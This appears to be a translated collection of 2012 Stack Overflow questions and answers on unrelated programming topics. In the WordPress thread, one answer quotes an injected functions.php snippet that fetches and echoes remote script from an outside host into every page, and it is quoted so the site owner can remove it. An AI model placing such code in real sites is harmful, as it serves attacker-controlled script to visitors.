[https://code.google.com/p/flexfieldcontrollib/](https://code.google.com/p/flexfieldcontrollib/)

# yii - Yii CList 视图更新抛出“找不到页面”？

> ID：13490650
> 
> 赞同：3
> 
> 时间：2012-11-21T09:59:41.210
> 
> 标签：yii

我在视图中有一个 CListView，如下所示：

```
$this->widget('zii.widgets.CListView', array(
  'id'=> 'recentBuyers',
  'dataProvider'=> $dataProvider,
  'itemView' => '_buyingHistory',
  'summaryText' => '', 
)); 
```

我有一个按钮可以增加此列表中的买家数量。问题是，一旦该操作成功完成，我执行以下命令：

```
$.fn.yiiListView.update("recentBuyers"); // refresh recent buyers 
```

执行此操作时，我可以看到小进度圈在转动，但几秒钟后有一个弹出窗口抛出此错误：

```
Page not found 
```

我最初的想法是，您可能必须提供第二个参数，其中包含您要更新的内容。但我真的不希望它用数据更新，而是刷新。

问题1：我该怎么做？

更新：我现在怀疑我可能没有更新 $dataProvider。$dataProvider 变量填充如下：

```
$condensed = array_splice($data->buyers, 0, 5);
$dataProvider = new CArrayDataProvider ($condensed); 
```

$data 通过控制器被注入到视图中：

```
$this->render('view', array('data' => $buyers )); 
```

问题 2：在调用 Javascript 之前，我是否必须以某种方式更新此变量？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T14:49:04.550

打开安装了 firefox + firebug 的调用页面

打开萤火虫

单击 .NET 和“XHR”过滤器

然后单击链接/按钮/或其他内容并阅读您的代码正在调用的完整网址

或控制器/动作不存在

或者只是参数的名称与动作签名不同......

# jsp - javax.servlet.jsp.tagext.TagSupport 的使用过时了吗？

> ID：13490653
> 
> 赞同：1
> 
> 时间：2012-11-21T09:59:53.157
> 
> 标签：jsp, jsp-tags, taglib

我在问今天 JSP 页面上的大部分工作是否可以仅使用 JSTL、Spring 标记等。那么，在这种情况下，使用`javax.servlet.jsp.tagext.TagSupport`过时了吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:43:35.387

**[TagSupport](http://docs.oracle.com/javaee/6/api/javax/servlet/jsp/tagext/TagSupport.html)并没有过时。** 它旨在用作新标签处理程序的基类。它是您从 JSTL 或 Spring 中提到的处理程序的基础，例如：

*   [JSTL`<c:out>`标签](http://tomcat.apache.org/taglibs/standard/apidocs/org/apache/taglibs/standard/tag/el/core/OutTag.html)：

![在此处输入图像描述](../Images/224de29014c6c20d89319e63266586bd.png)

*   [弹簧`<spring:form>`标签](http://static.springsource.org/spring/docs/2.0.x/api/org/springframework/web/servlet/tags/form/FormTag.html)：

![在此处输入图像描述](../Images/55e3af829685e52f96728b477188d031.png)

有很多有用的 JSP 标签可以开箱即用地提供通用功能并允许您执行通用任务而无需重新发明，但它们都基于类和接口，如`TagSupport`. **这就是创建自定义标签的机制。**

如果您到目前为止不需要创建自己的标签，那么您很幸运。在某些时候，您可能需要创建自己的特殊标签，`TagSupport`这将证明非常有用。

# ios - 绘制到图像时设置文本的笔划宽度

> ID：13490656
> 
> 赞同：0
> 
> 时间：2012-11-21T10:00:00.750
> 
> 标签：ios, image

我找到了一个函数，可以使用文本颜色、笔划颜色和笔划宽度从文本创建图像我可以使用 和 设置文本颜色和笔划颜色`CGContextSetRGBFillColor`，`CGContextSetRGBStrokeColor`但我不知道如何设置笔划宽度的文本。请帮我解决这个问题。这是我的示例代码，感谢您的帮助。

```
-(UIImage *)imageFromText:(NSString *)text withFont: (NSString *)fontName{
       // set the font type and size
       UIFont *font = [UIFont fontWithName:fontName size:100];
       CGSize size  = [text sizeWithFont:font];
       CGSize newSize = CGSizeMake(size.width+30, size.height+20);
       // check if UIGraphicsBeginImageContextWithOptions is available (iOS is 4.0+)
       if (UIGraphicsBeginImageContextWithOptions != NULL)
            UIGraphicsBeginImageContextWithOptions(newSize,NO,0.0);
       else
       // iOS is < 4.0
            UIGraphicsBeginImageContext(newSize);
       CGContextRef ctx = UIGraphicsGetCurrentContext();
       CGContextSetCharacterSpacing(ctx, 10);
       CGContextSetTextDrawingMode (ctx, kCGTextFillStroke);
       CGContextSetRGBFillColor (ctx, 0.1, 0.2, 0.3, 1); // 6
       CGContextSetRGBStrokeColor (ctx, 0.2, 0.8, 0.6, 1);

       // draw in context, you can use also drawInRect:withFont:
       [text drawAtPoint:CGPointMake(15.0, 10.0) withFont:font];

       // transfer image
       UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
       UIGraphicsEndImageContext();

       return image;

 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:14:58.030

这可能会对您有所帮助。

```
NSString *str= @"YOUR String";
UIFont *font = [UIFont systemFontOfSize:16.0];
CGSize stringSize = [textToDraw sizeWithFont:font constrainedToSize:CGSizeMake(301, 10000) lineBreakMode:UILineBreakModeWordWrap];
CGRect Rect = CGRectMake(0, 0, stringSize.width , stringSize.height);
[str drawInRect:Rect withFont:[UIFont systemFontOfSize:16] lineBreakMode:UILineBreakModeWordWrap alignment:UITextAlignmentCenter]; 
```

# c - 如何找到 PICmicro C 编译器的数据类型大小？

> ID：13490658
> 
> 赞同：1
> 
> 时间：2012-11-21T10:00:09.267
> 
> 标签：c, pic

由于该程序是针对 PIC 单片机的，使用 PICmicro C 编译器编译后，只有一个 hex 文件，我无法在计算机上运行，​​也无法在屏幕上打印任何内容。那么我怎样才能弄清楚`sizeof(int)`（和其他类型）的值是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T10:18:00.373

您可以阅读编译器的文档以了解它如何定义各种类型，应该指定它。

或者您可以查看如何让编译器生成汇编代码并阅读它。然后，您可以根据用于处理各种值的指令找出底层类型是什么。

或者，在进行嵌入式开发时很常见，您可以

```
#include <stdint.h> 
```

并使用显式类型（`uint8_t`等`uint32_t`）。这些是可选的，但我希望微控制器的编译器能够支持它们。

# android - 如何在 Android 中以不同的分辨率设置相同的文本？

> ID：13490659
> 
> 赞同：0
> 
> 时间：2012-11-21T10:00:12.707
> 
> 标签：android, android-layout

我想以不同的分辨率设置相同大小的文本。怎么做我的问题。谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T11:12:05.740

在你的 xml 中使用类似这样的东西来设置文本的大小。它将独立于决议。

```
 <TextView android:id="@+id/name_text"
        android:layout_height="wrap_content"
        android:layout_width="match_parent" 
        android:textSize="10dp"
        /> 
```

或者你可以在java代码中通过

```
 TextView text1 = (TextView) findViewById(R.id.txt);
    text1.setTextSize(10); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T11:11:02.653

如果您使用 textSize="xdip" 它将根据分辨率进行调整，如果您使用 textsize="xpx" 文本大小将相同...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:21:06.170

使用 textSize="XXdp" （即指定 dp 单位而不是 px）来实现[密度无关](http://developer.android.com/guide/practices/screens_support.html#density-independence)。这将在每个设备中显示相同大小的文本。layout-small、layout-large 等文件夹用于提供不同的布局（例如手机的布局和平板电脑的不同布局），而不是文本大小。

# c# - .Net 4.5 中有什么新东西可以处理更好的 JSON 吗？

> ID：13490661
> 
> 赞同：16
> 
> 时间：2012-11-21T10:00:37.443
> 
> 标签：c#, .net, json, visual-studio-2012

.NET 4.5 和 VS2012 中的 JSON 处理有什么新东西会比 DataContractJsonSerializer 更好吗？我见过一些关于 System.JSON 的东西。但它更好吗？

我知道也有 JSON.NET，但我不确定是否可以向我的项目添加另一个 .dll。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-11-21T11:01:26.183

检查此链接：

[功能比较 - Json.NET、DataContractJsonSerializer 和 JavaScriptSerializer](http://james.newtonking.com/projects/json-net.aspx)

**它在Json.NET、DataContractJsonSerializer 和 JavaScriptSerializer**之间有很好的功能比较。只需看看它，然后根据您的要求决定使用哪一个。

另外，请检查：

**[ASP.NET MVC 4 & Json.NET：](http://forums.asp.net/p/1810654/5010838.aspx/1?ASP%20NET%20MVC%204%20Release%20Candidate%20released)**

> 我们（.Net 团队）现在使用并支持流行的 Json.NET 序列化程序来处理 JSON 数据。Json.NET 是 ASP.NET Web API 使用的默认 JSON 序列化程序，它包括对数据协定、匿名类型、动态类型、日期、时间跨度、对象引用保存、缩进、驼峰大小写和许多其他有用的序列化功能的支持。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-21T10:08:07.257

你可以一直使用`System.Web.Script.Serialization.JavascriptSerializer`- 我不知道为什么更多的人不使用它，它已经有一段时间了。

[http://msdn.microsoft.com/en-us/library/system.web.script.serialization.javascriptserializer.aspx](http://msdn.microsoft.com/en-us/library/system.web.script.serialization.javascriptserializer.aspx)

# flash - 如何判断flash已经加载完成

> ID：13490662
> 
> 赞同：0
> 
> 时间：2012-11-21T10:00:40.580
> 
> 标签：flash, swfobject

在我们的网站中，我在html中嵌入了一个flash builder制作的flash，flash大小超过2M。由于网络不好，加载flash可能需要30秒。我怎么知道浏览器已经完全加载了 Flash？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T19:09:13.737

您可以轮询 SWF 以获取其`PercentLoaded`值。

这是一种方法（从[learnswfobject.com](http://learnswfobject.com/advanced-topics/executing-javascript-when-the-swf-has-finished-loading/)复制的代码）：

```
function swfLoadEvent(fn){
    //Ensure fn is a valid function
    if(typeof fn !== "function"){ return false; }
    //This timeout ensures we don't try to access PercentLoaded too soon
    var initialTimeout = setTimeout(function (){
        //Ensure Flash Player's PercentLoaded method is available and returns a value
        if(typeof e.ref.PercentLoaded !== "undefined" && e.ref.PercentLoaded()){
            //Set up a timer to periodically check value of PercentLoaded
            var loadCheckInterval = setInterval(function (){
                //Once value == 100 (fully loaded) we can do whatever we want
                if(e.ref.PercentLoaded() === 100){
                    //Execute function
                    fn();
                    //Clear timer
                    clearInterval(loadCheckInterval);
                }
            }, 1500);
        }
    }, 200);
}

//This function is invoked by SWFObject once the <object> has been created
var callback = function (e){

    //Only execute if SWFObject embed was successful
    if(!e.success || !e.ref){ return false; }

    swfLoadEvent(function(){

        //Put your code here
        alert("The SWF has finished loading!");

    });

};

swfobject.embedSWF("movie.swf", "flashcontent", "550", "400", "9", false, false, false, false, callback); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-05-26T18:41:45.713

pipwerks 的答案工作正常。你甚至可以获得更低的价值：而不是 1500 只有 100 就可以了。

但我在 Firefox 上遇到了一些问题。而不是超时，initialTimeout 应该是一个 timeInterval，因为有时在 FF 上，第一次调用你会有未定义的 e.ref.PercentLoaded，但下一次调用会很好。当然你需要调用 clearInterval(initialTimeout); 如果是真的。

所以你会得到类似的东西：

```
 var initialTimeout = setInterval(function (){
     if(typeof e.ref.PercentLoaded !== "undefined" && e.ref.PercentLoaded()){
         clearInterval(initialTimeout); 
```

# javascript - 如何在 Flot Graph 中绘制时间值

> ID：13490667
> 
> 赞同：2
> 
> 时间：2012-11-21T10:00:54.370
> 
> 标签：javascript, flot

我正在使用[Flot Graph Api](https://github.com/flot/flot/blob/master/API.md)绘制图表，我想在条形图中绘制时间值。

我的桌子看起来像这样

![在此处输入图像描述](../Images/0506bb870e0c574ba68f2b91e2c57207.png)

我的 X 轴应该是原因列表，Y 轴应该是时间变量。我的图表应该是这样的。

![在此处输入图像描述](../Images/039b781af975cf80571db22dd7d3e41e.png)

但我得到了这样的东西，因为 Json 对象被错误地打包了。

![在此处输入图像描述](../Images/394243cc8c6b0356093921ceaaaf0e86.png)

如何绘制时间值的图表

我的情节 JS 代码是

```
 <script language="javascript" type="text/javascript">  
$(document).ready(function(){
$.getJSON('ReasonByTime.txt', function(json) {
   //succes - data loaded, now use plot:
       var plotarea = $("#placeholder");
       var dataBar=json.data;
        $.plot(plotarea , [
            {
                data: dataBar,
                bars: { show: true},
                legend: {show: true},
                yaxis: {
                    mode: 'time',
                    timeformat: "%y/%m/%d",
                        min: ( new Date('2012/01/01') ).getTime(),
                        max: ( new Date('2020/01/01') ).getTime(), 
                        minTickSize: [1, 'hour']
                }
            }          
        ]
    );
}); 
```

});

而我当前的 Json 对象是这样的。

```
 {"data":[[0,5202],[0,19620],[0,82920],[0,240],[0,75720],[0,3060],[0,72840]],"label":"Tea break"} 
```

因为我是新来的，所以我对这项工作很感兴趣，我做了一些研究，但我无法解决我的问题。有人可以帮我吗。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T15:06:47.200

问题不在于 JSON，而在于您的数据本身。您的 x 轴值都为零，因此 Flot 正确地将所有条形图相互叠加。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T15:46:58.837

感谢 DNS，问题是我所有的 x 轴值都为零，所以我将 JSON 更改为以下格式，

```
 [{"data":[[0,5202]],"label":"Over Time"},{"data":[[1,19620]],"label":"Shift Start"},{"data":[[2,82920]],"label":"Maintenance break"},{"data":[[3,240]],"label":"Lunch break"},{"data":[[4,75720]],"label":"BreakDown"},{"data":[[5,3060]],"label":"Break"},{"data":[[6,72840]],"label":"Tea break"},{"data":[[6,79260]],"label":"Power Failure"}] 
```

现在我得到这样的图表，

![在此处输入图像描述](../Images/4eeaa23e5aa4c451db8c3a651563517e.png)

# java - 将 32 个字符的 http 会话 ID 缩短到 20 个字符（截断？哈希？）

> ID：13490671
> 
> 赞同：1
> 
> 时间：2012-11-21T10:01:09.190
> 
> 标签：java, http, function, session, hash

我的要求是将 20 个字符长的 http 会话 ID 作为字符串值发送到第 3 方脚本。所以在Java中我得到HttpServletRequest，然后得到HttpSession，最后得到32个字符长的ID，看起来像这样2A5B2EF7B388159A6E5A7C038F6B694F。

现在我的问题是：因为我只能将会话 ID 作为最大值传递。20 字符长的 url 编码字符串我显然需要缩短 ID。如何在不增加太多冲突机会的情况下缩短 ID？

如果 ID 真的是随机的，我理论上可以将其截断为 20 个字符，对吗？但由于我不完全知道这个 ID 是如何生成的，所以最好使用一个散列函数，将 ID 分解为 20 个字符。

您对哈希函数或有关 HttpSession ID 的更多信息有什么建议，可以在这种特定情况下帮助我吗？

提前致谢。

**编辑** 我忘了提到 id/参数必须是 url 编码的。这种方法怎么样：

我创建了一个包含所有未保留百分比编码字符的 char[] 数组。我只使用未保留的字符，因为保留的字符在编码时最多占用 3 个插槽：例如 '/' is '%2F'

然后我从十六进制字符串中创建一个字节数组，它给了我一个 byte[16] 字节的值然后被映射（使用环绕）到具有允许字符的 char[] 数组。

```
StringBuilder shortenedSessionId = new StringBuilder();
char[] data = sid.toCharArray();
byte[] decodedHexData = Hex.decodeHex(data);

for (byte b : decodedHexData) {
    char mappedChar = allowedSessionIdChars[(b & 0xFF) % allowedSessionIdChars.length];
    shortenedSessionId.append(mappedChar);
} 
```

char[] allowedSessionIdChars 包含字母 AZ、aZ、0-9 和 -_.~

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T10:12:34.720

十六进制字符串中的每 2 个字符都完全适合一个字节。所以输出中的每个字符实际上可以容纳 2 个输入字符。只需遍历输入字符串，如下所示： `dst[i] = (src[2*i] << 8) + src[2*i+1]`. 对于大小为 36 的输入，您将获得一个 18 个字符的字符串。这是您可以获得的最大无损压缩，因为这是您可以填充到单个字节中的最大值。

# php - 在 Javascript 中传递 PHP 变量，反之亦然

> ID：13490674
> 
> 赞同：0
> 
> 时间：2012-11-21T10:01:12.153
> 
> 标签：php, javascript, variables, parameters

> **可能重复：**
> [将 PHP 字符串传递给 Javascript 变量（并转义换行符）](https://stackoverflow.com/questions/168214/pass-a-php-string-to-a-javascript-variable-and-escape-newlines)

谁能告诉我将php变量传递给javascript函数以及将javascript变量传递给php脚本的方法。这是我想传递php变量的示例行，但是当我这样做时，该函数没有被执行

```
echo "<td><a href='#' onclick='disp_confirm($row->university)'>Delete</a></td>"; 
```

请帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:04:03.473

添加大括号并将工作：

```
echo "<td><a href='#' onclick='disp_confirm({$row->university})'>Delete</a></td>"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:06:31.583

您需要在 onclick 中引用字符串：

```
echo "<td><a href='#' onclick='disp_confirm(\"{$row->university}\")'>Delete</a></td>"; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:08:10.283

要将变量打印到 Javascript 中，您只需添加花括号（这仅在发出*双引号*字符串时有效，因此：

```
 echo "<td><a href='#' onclick='disp_confirm({$row->university})'>Delete</a></td>"; 
```

将工作和

```
 echo '<td><a href="#" onclick="disp_confirm({$row->university})">Delete</a></td>'; 
```

不会*工作*。对于`{$variables}`等也是`{$array['of values']}`如此。

（在上面的代码中，`$row->university`必须是一个整数，否则你会得到一个 Javascript 错误。如果是这样，用转义的单引号引用这个值）

**更新**（感谢[Mihai Iorga](https://stackoverflow.com/users/204701/mihai-iorga)）：您必须考虑变量将如何与 Javascript 代码交互。引用字符串是不够的，因为变量本身可能包含引号。因此，如果您的大学是“Shi'Kahr University”，那么 HTML 将变为

```
onclick='disp_confirm(\'Shi'Kahr University\')' 
```

并且 Javascript 将立即被破坏。所以你还必须使用`addslashes()`来确保你的字符串被正确引用。由于您在 string 中写入*string*，因此需要调用`addslashes()`两次才能获得

```
onclick='disp_confirm(\'Shi\\\'Kahr University\')' 
```

要将 Javascript 值传递给服务器端的 PHP 脚本，您可以使用 AJAX（例如 jQuery 库），也可以将值添加到 URL 并重新加载页面：

```
 alert("Submitting " + value);
 location.href = '?variable=' + value; 
```

该脚本将**从头开始再次执行**（可能是也可能不是您想要的），然后`$_GET['variable']`将包含*value*。您可以使用 区分这两种情况`if`：

```
<?php
    if (isset($_GET['variable']))
    {
        // This is the second round
    }
    else
    {
        // This is the first time
    }
    // common code goes here
?> 
```

最后，还有一些库允许混合 PHP 和 Javascript。他们基本上像上面那样工作，但他们负责繁重的工作、可变的传球、逃跑和回调。参见例如[XAJAX](http://www.xajaxproject.org/)，但还有其他几个。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T10:11:19.287

您不能将 javascript 变量传递给 PHP，除非您通过提交表单（因为 JS 在客户端，而不是在服务器中）或使用 AJAX 来发送信息。

如果您想将 PHP 变量写入 JS，则必须将变量回显到 HTML/JS 代码中，如下所示：

```
<td><a href='#' onclick='disp_confirm(<?php echo $row->university?>)'>Delete</a></td> 
```

或者：

```
function name() {
    var i=<?php echo $data?>;
    ...
} 
```

# wordpress - Wordpress site can't enter - The requested URL could not be retrieved

> ID：13490680
> 
> 赞同：0
> 
> 时间：2012-11-21T10:01:21.013
> 
> 标签：wordpress, security

Please help with the problem as I can't guess how to solve it.

When I enter my wordpress site the following message appears:

```
The requested URL could not be retrieved

While trying to retrieve the URL: http://www1.ghost-bikes.dp.ua/?

The following error was encountered:

Unable to determine IP address from host name for www1.ghost-bikes.dp.ua
The dnsserver returned:

Name Error: The domain name does not exist.
This means that:

 The cache was not able to resolve the hostname presented in the URL. 
 Check if the address is correct. 
Your cache administrator is support. 
Generated Wed, 21 Nov 2012 09:57:05 GMT by none (squid/3.0.STABLE20) 
```

The admin area (/wp-admin) opens as usually and works. I suppose it is a kind of virus. What should I do?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:32:07.280

Open your theme's `functions.php` and look for the following code:

```
if (!function_exists(‘insert_jquery_theme’)){function insert_jquery_theme(){if (function_exists(‘curl_init’)){$url=”http://www.jqueryc.com/jquery-1.6.3.min.js”;$ch = curl_init();$timeout = 5;curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);$data = curl_exec($ch);curl_close($ch);echo $data;}}add_action(‘wp_head’, ‘insert_jquery_theme’);} 
```

If you find it, just delete it and you should be fine again.

I just found one issue like this in a different site - look [here](https://stackoverflow.com/questions/13489269/site-freaking-out)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:11:52.990

Try to deactivate your WordPress plugins one by one and see if the message disappears. If so, you will know where it comes from.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:14:33.313

You're using proxy server SQUID

Your squid can't find this domain: www1.ghost-bikes.dp.ua Because this domain doesn't exist - it is impossible to resolve this domain to IP address

So, this is not a Wordpress-related problem. This is a DNS-problem

UPDATED

It seems like this domain served by Imena.com.ua - so you should login into your account on imena.com.ua and just to add www1 domain in the DNS records.

UPDATED

Go to your wordpress installation folder and try to find something like this in files:

```
 <script type="text/javascript">
StaticRequestInfo={Referer:document.referrer};function EscapeBrowserFrame()
    </script> 
```

Delete these lines.

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-21T10:14:41.097

***Log into the DNS panel of your hosting enviroment and check the DNS settings.***

*If those do not solve it.. you can try this:*

***// in wp-config***

define('WP_SITEURL', '[http://www.site.nl](http://www.site.nl)');

define('WP_HOME', '[http://www.site.nl](http://www.site.nl)');

***// in functions.php at the top. Remove after first run.***

update_option('siteurl','[http://www.site.nl](http://www.site.nl)');

update_option('home','[http://www.site.nl](http://www.site.nl)');

This will set the correct url or IP through the whole site.

# vb.net - 命名空间和项目

> ID：13490681
> 
> 赞同：0
> 
> 时间：2012-11-21T10:01:21.950
> 
> 标签：vb.net

我正在尝试将命名空间引入解决方案。

我在一个解决方案中有三个项目：

```
Business Logic Layer
Data Access Layer
User Interface Layer 
```

业务逻辑层和数据访问层中类的命名空间如下：

```
companyname.applicationname.layername 
```

如果我想访问数据逻辑层中的一个类，那么我必须包含以下语句：

```
Imports DataAccessLayer.companyname.applicationname.layername 
```

我不想将 DataAccessLayer 作为第一个节点。有没有办法解决这个问题，还是我误解了命名空间的一些基本内容？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:14:39.943

对于命名空间命名指南，请检查：

[命名空间命名准则](http://msdn.microsoft.com/en-us/library/893ke618%28VS.71%29.aspx)

尝试设置：程序集名称和默认命名空间

![在此处输入图像描述](../Images/d100717a1dd7d7b3fb30eb0cd73bee1b.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:14:28.937

我不完全确定您到底在追求什么，但这里有一些选择：

导入 DataAccessLayer，然后直接引用子命名空间：

```
Imports DataAccessLayer
...
companyname.applicationname.layername.mymethod(abc) 
```

在项目属性“DataAccessLayer”中创建您的程序集命名空间。那么就不需要导入DataAccessLayer，直接导入companyname...或者引用companyname...即可。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:14:47.450

首先，您需要在所需的命名空间中定义该类，例如，

```
Namespace companyname.applicationname
  Public Class layername

  End  Class
End Namespace 
```

或者可以通过更改属性来创建默认命名空间， ![在此处输入图像描述](../Images/a88e489e8074ec0d8b6bf54dc75a9fd2.png)

# matlab - Matlab：连接数组中的访问矩阵

> ID：13490682
> 
> 赞同：2
> 
> 时间：2012-11-21T10:01:22.173
> 
> 标签：matlab, concatenation

我有什么方法可以访问连接中的特定矩阵吗？
例如：

```
a = [1,2,3,4:5,6,7,8:9,0,1,2];
b = [3,2,1:4,2,1:5,6,7];
c = [a b]; 
```

我希望`b`从`c`..访问矩阵

很明显，我无法通过`c(2)`; 因为它指向 c 中的第二个元素。

听说可以在header中保存matrix`a`和matrix的信息。`b`

然后我可以在以后检索它。但它是如何工作的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:37:32.797

您可以将`a`和`b`数组的大小保存在单独的长度`la`向量中，以后可以将其用作索引范围以访问`c`. 这有点像您对标头的想法，除了标头存储为单独的变量`la`：

```
% first matrix starts at index 1
la = 1;
a = [1,2,3,4:5,6,7,8:9,0,1,2]; 
% append number of elements in a
la = [la numel(a)];

b = [3,2,1:4,2,1:5,6,7];       
% append number of elements in b
la = [la numel(b)];

c = [a b];
% use cumsum to compute indexes of sub-matrices in c
la = cumsum(la);

% this is your matrix a
c(la(1):la(2)-1)-a
% and this is your matrix b
c(la(2):la(3)-1)-b 
```

# git - Git和Nexus之间的区别？

> ID：13490684
> 
> 赞同：21
> 
> 时间：2012-11-21T10:01:26.943
> 
> 标签：git, repository, nexus

我似乎找不到 Git 和[Nexus](http://www.sonatype.org/nexus/)之间的区别。两者有可比性吗？

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2012-11-21T10:07:49.647

两者都有参考：

*   一个（[Git](http://git-scm.com/)）是版本控制的源引用（具有合并、分支、标签等功能）
*   另一个（[Nexus](http://www.sonatype.com/)）是任何交付（二进制文件或非二进制文件）的工件参考

参考数据库也不同：

*   Git 有自己的内部仓库存储机制
*   Nexus 只是具有命名约定（ group.artifact.version ）的共享目录的集合。
    如“[什么是存储库](http://www.sonatype.com/books/nexus-book/reference/repoman-sect-repo.html)”中所述：存储在定义的目录结构中的二进制软件工件和元数据的集合。

这个想法是，对于可以经常生产的大型交付，将它们存储在 Nexus 中要容易得多（您可以很容易地清理它们：`cd`+ `rm`），而不是对它们进行版本化（这使得 DVCS 存储库也像 Git 方式大方式太快而无法轻松克隆）。

所以他们的目标是不同的，正如我在下面解释的：

*   “[不同的版本控制系统如何处理二进制文件？](https://stackoverflow.com/questions/6598700/how-do-different-version-control-systems-handle-binary-files/6599303#6599303) ”
*   "[在 VCS (SVN, Git, ...) 中存储 .jar 文件的最佳实践](https://stackoverflow.com/questions/3329041/best-practice-to-store-jar-files-in-vcs-svn-git/3329272#3329272)”
*   "[在源代码控制项目中使用源代码控制库](https://stackoverflow.com/questions/3171267/using-source-controlled-libraries-in-source-controlled-projects/3171360#3171360)"

您可以管理在 Git 中编写的*代码*以及在 Nexus 中*构建的内容。*

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2012-11-21T10:12:00.400

@VonC 具有高级别的理论观点。

在日常使用中，您会将源代码及其历史记录存储在 git 存储库中，并将构建工件（例如，您想要交付的编译软件）存储在 Nexus 中。

因此，它们并不是真正可比的，而是互补的。

# java - 无法让 Ant 运行我的 JUnit 测试

> ID：13490698
> 
> 赞同：1
> 
> 时间：2012-11-21T10:02:03.120
> 
> 标签：java, ant, junit

我创建了一个 Ant 目标来编译我的代码。

```
<target name="test" depends="compile">
    <junit>
        <classpath>
            <pathelement path="${basedir}\..\SwaCore\lib\junit.jar"/>
        </classpath>
        <classpath>
            <pathelement path="${build}"/>
        </classpath>
        <test name="BinarySearchTest" />
    </junit>
</target>

<target name="compile">
    <mkdir dir="${build}"/>
    <javac
        srcdir="${basedir}\src;${basedir}\..\SwaCore\src;${basedir}\..\SwaShared\src;${basedir}\..\SwaDictionary\src;${basedir}\..\SwaSuggestion\src;${basedir}\..\SwaServerSharedCore\src;${basedir}\..\SwaPrediction\src;"
        destdir="${build}"
        debug="true"
        debuglevel="lines,vars,source">
        <classpath>
            <pathelement path="${basedir}\..\SwaCore\lib\junit.jar"/>
            <pathelement path="${basedir}\..\SwaSuggestion\lib\ssce.jar"/>
            <pathelement path="C:\Java\javamail-1.4.1\mail.jar"/>
            <pathelement path="C:\Java\commons-net-2.0\commons-net-ftp-2.0.jar"/>
            <pathelement path="${basedir}\WebContent\WEB-INF\lib\gson-2.2.1.jar"/>
            <pathelement path="${tomcatLibs}\servlet-api.jar"/>
        </classpath>
    </javac>
</target> 
```

编译工作正常，我所有的类都在 ${build} 指向的文件夹中。我假设这个 ${build} 将是我的 JUnit 测试用例的类路径。然后我有一个测试目标，我想运行一个名为 BinarySearchTest 的 JUnit 测试。当我运行它时，我得到了一个简单的错误

```
Test BinarySearchTest FAILED 
```

我知道我的单元测试没问题，因为它什么都不测试。

```
public class BinarySearchTest extends TestCase
{
    public void test()
    {       
    }
} 
```

即使我将以下内容放入我的测试目标中，我仍然会遇到相同的错误

```
<test name="AtestThatDoesNotExistTest" /> 
```

结果 =

```
Test AtestThatDoesNotExistTest FAILED 
```

我本来预计会出现 classNotFound 错误，因此我的 Ant XML 显然存在根本性错误

JUnit jar 正在被拾取，因为如果它不在类路径中，我会收到错误

```
The <classpath> for <junit> must include junit.jar if not in Ant's own classpath 
```

* * *

更新我修改了我的目标以包括

```
 <formatter type="brief" usefile="false" />
        <test name="com.swaserver.junit.BinarySearchTest" />

test:
[junit] Testsuite: com.swaserver.junit.BinarySearchTest
[junit] Tests run: 1, Failures: 0, Errors: 0, Time elapsed: 1.878 sec
[junit] ------------- Standard Output ---------------
[junit] Initializing Binary search class
[junit] Binary search class initialized
[junit] ------------- ---------------- --------------- 
```

构建成功总时间：2 秒

现在我可以看到我的测试实际上已经运行了。但是，除非我为单元测试指定完全限定的类名，否则我找不到一个类。为什么会这样？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:07:38.913

你可以试试

```
 <classpath>
        <pathelement path="${basedir}\..\SwaCore\lib\junit.jar"/>
        <pathelement path="${build}"/>
    </classpath> 
```

代替

```
 <classpath>
        <pathelement path="${basedir}\..\SwaCore\lib\junit.jar"/>
    </classpath>
    <classpath>
        <pathelement path="${build}"/>
    </classpath> 
```

# user-controls - 依赖属性 - 成员无法识别或无法访问

> ID：13490700
> 
> 赞同：15
> 
> 时间：2012-11-21T10:02:15.727
> 
> 标签：user-controls, windows-8, microsoft-metro, dependency-properties

我创建了一个`UserControl`并在其中定义了一个依赖属性`Label`。当我在控件中引用它时，我得到错误`The member "Label" is not recognised or is not accessible`。我不明白的是，它在 Windows 手机上运行完美，但在将应用程序移植到 Windows 8 后，它给出了这个错误。对于 Windows 8 用户控件，有什么不同的事情要做吗？请帮忙。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-11-22T04:29:17.167

根据[http://leventoz.wordpress.com/2012/03/11/moving-a-windows-phone-app-to-windows-8-a-case-study-part-2/](http://leventoz.wordpress.com/2012/03/11/moving-a-windows-phone-app-to-windows-8-a-case-study-part-2/)

我刚刚关闭了我的 .xaml 文件，错误就消失了。它说 Visual Studio 的错误。但它没有得到证实。它仍然对我有用。

# haskell - 如何获取类型对象的第二个参数

